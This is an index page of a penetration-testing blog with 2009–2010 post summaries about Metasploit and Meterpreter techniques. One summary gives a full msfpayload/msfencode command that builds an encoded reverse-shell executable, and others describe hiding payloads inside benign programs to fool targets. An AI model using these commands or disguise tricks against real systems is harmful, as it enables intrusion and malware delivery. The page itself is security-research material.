		            <span class="post-date-day"><sup>12</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Sep</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-resource-files" href="https://room362.com//categories/resource-files">resource files</a>
      					
					        <a class="post-category post-category-script" href="https://room362.com//categories/script">script</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Exploit modules inside of metasploit don&rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here. // The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&rsquo;ve broken it up into sections.
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-08-13-metasploit-turns-10000/">Metasploit turns 10,000</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>13</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Aug</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Ask any developer and they will tell you that the age of a project is not calculated in calendar time, but in worker hours or &ldquo;commits&rdquo; to a project. The Metasploit Framework hit 10,000 today. With the project dating back to 2003, much before the official &ldquo;Revision 1&rdquo; happened, there have been a lot of changes. Going from the initial incarnation as a network &ldquo;game&rdquo; written in perl to the world largest ruby project, the framework has seen it&rsquo;s fair share of blood, sweat, and tears.
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-08-13-metasploit-turns-10000/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/">Intro to RailGun: WIN API for Meterpreter</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>8</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jul</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-railgun" href="https://room362.com//categories/railgun">railgun</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Back on June 13th, &ldquo;Patrick HVE&rdquo; released RAILGUN: http://mail.metasploit.com/pipermail/framework/2010-June/006382.html And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712: http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712 Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls: iphlpapi ws2_32 kernel32 ntdll user32 advapi32 (You can find out exactly what functions are available by default in the api.rb file) It&rsquo;s also very extensible, it doesn&rsquo;t have a DLL or function you need?
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-06-28-set-wallpaper-meterpreter-script/">Set Wallpaper Meterpreter Script</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>28</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-script" href="https://room362.com//categories/script">script</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Certainly nothing to fuss over, but I&rsquo;ve had a fascination with setting my target&rsquo;s wallpaper as sort of a calling card for years now. I&rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&hellip; First, is the most important part, selection of the wallpaper. This is my first selection: But, it has to be a BMP.
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-06-28-set-wallpaper-meterpreter-script/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-05-07-exploit-privilege-escalation/">0Exploit Privilege Escalation</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>7</sup></span><span class="post-date-separator">/</span><span class="post-date-month">May</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-pivoting" href="https://room362.com//categories/pivoting">pivoting</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	The other day Chris Gates posted an excellent blog post about the WebDAV hotness that Chris Sullo (author of Nikto) cooked up (DAVTest) which Ryan Linn popped out a Metasploit module for. Anyways, the story left off being a very limited user called &ldquo;Network Service&rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot. meterpreter &gt; getuid Server username: **NT AUTHORITYNETWORK SERVICE** Lets look around a bit..
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-05-07-exploit-privilege-escalation/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2010/2010-04-01-metasploit-cyberwarfare/">Metasploit Cyberwarfare</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>1</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Apr</span> <span class="post-date-year">2010</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	I&rsquo;m not sure I will want to svn up tomorrow. This Cyberwarfare version has advanced powers:
            </article>
			<div class="read-more-link">
				<a href="/post/2010/2010-04-01-metasploit-cyberwarfare/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/">Meterpreter tunneling and VNC revamped</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>15</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Dec</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>4 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
					        <a class="post-category post-category-vnc" href="https://room362.com//categories/vnc">vnc</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote: Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin. https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb Or you can get it via the SVN at Revision 7872 By creating a bind payload instead of a reverse connect we can have the payload listen locally.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-12-09-metasploit-with-ruby-191/">Metasploit with Ruby 1.9.1</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>9</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Dec</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-ruby" href="https://room362.com//categories/ruby">ruby</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	UPDATE: if you don&rsquo;t make some additional steps, the &lsquo;rvm 1.9.1&rsquo; command only is active for the current console session. See the site for details: http://rvm.beginrescueend.com/ This short tutorial is how to get Ruby 1.9.1 on BT4 or any other Linux distro with the tool &lsquo;rvm&rsquo; (Ruby Version Manager). The Metasploit team has put a lot of work into getting the framework to work well with 1.9.1 and still work with earlier versions.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-12-09-metasploit-with-ruby-191/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/">Metasploit Blends in: New MSFPayload/ENcode</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>3</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Nov</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework. But before I get into the new feature, lets quickly go over the standard way you use msfencode: root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3# We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/">Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>3</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Oct</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video. Metasploit meterpreter Windump/Winpcap sniffer from siles on Vimeo.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-06-26-metasploit-framework-as-a-payload/">Metasploit Framework as a Payload</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>26</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>2 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-meterpreter" href="https://room362.com//categories/meterpreter">meterpreter</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Well, sorta… I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun. Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-06-26-metasploit-framework-as-a-payload/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-06-10-passivex-fun-with-metasploit/">PassiveX fun with Metasploit</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>10</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jun</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-passivex" href="https://room362.com//categories/passivex">passivex</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the IExpress “hack” would make for an very hard to spot payload. A really down and dirty explination of what PassiveX is and why it&rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-06-10-passivex-fun-with-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-03-09-metasploit-3s-microsoft/">Metasploit &lt;3s Microsoft</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>9</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Mar</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-iexpress" href="https://room362.com//categories/iexpress">iexpress</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Update to post: Metasploit Heart&rsquo;s Microsoft Ok, so many people had issues with the Vimeo video, that I posted it to youtube in hopes that you&rsquo;ll be able to play it all the way through. I still have no idea what the issue is, it&rsquo;s played perfectly on all the computers that I&rsquo;ve tried it on.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-03-09-metasploit-3s-microsoft/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-03-02-metasploit-hearts-microsoft/">Metasploit heart&#39;s Microsoft</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>2</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Mar</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-iexpress" href="https://room362.com//categories/iexpress">iexpress</a>
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Hiding Meterpreter with IExpress from mubix on Vimeo. Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it&rsquo;s easyier to dupe, or a different malicious executable (leekspin perhaps?). I&rsquo;ll let your minds take this to the level I know you all are capable of.
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-03-02-metasploit-hearts-microsoft/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
          <section  class="post">
            <header class="post-header">
            
            <h1 class="post-title">
              <a href="/post/2009/2009-02-04-metasploit-across-the-net/">Metasploit Across the Net</a>
            </h1>
            </header>
            <p class="post-meta">
            	
		          <span class="post-date">
		            <span class="post-date-day"><sup>4</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Feb</span> <span class="post-date-year">2009</span>
		          </span>
      				
      				
      					By <a class="post-author" >mubix</a>
      				
              
                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>1 min. read</em></span>
              
      				
      					<div class="post-categories">
				        
      					
					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
      					
					        <a class="post-category post-category-internet" href="https://room362.com//categories/internet">internet</a>
      					
      					</div>
      				
            </p>
            <article class="post-summary">
            	Metasploit is awesome, but some don’t know that their are updates all the time via SVN, and even fewer know of places to get good non-svn modules / scripts. Here are a few of my favorites: https://www.securinfos.info/metasploit/msfxdc.php http://metasploit.com/users/mc/ http://darkoperator.blogspot.com &ndash; newly added, check out the CookieMonster script and a host of others: http://pentest.cryptocity.net And of course: http://carnal0wnage.blogspot.com/
            </article>
			<div class="read-more-link">
				<a href="/post/2009/2009-02-04-metasploit-across-the-net/"><span class="read-more-slashes">//</span>Read More...</a>
			</div>
          </section>
        
      </div>

      <div class="footer">
	<hr class="thin" />
	<div class="pure-menu pure-menu-horizontal pure-menu-open">
		<ul class="footer-menu">
		
			<li><a href="/about">About</a></li>
		
			<li><a href="/post">Blog</a></li>
		
		</ul>
	</div>

	<p>&copy; 2016. All rights reserved.</p>
</div>
    </div>
  </div>
  
</body>
</html>
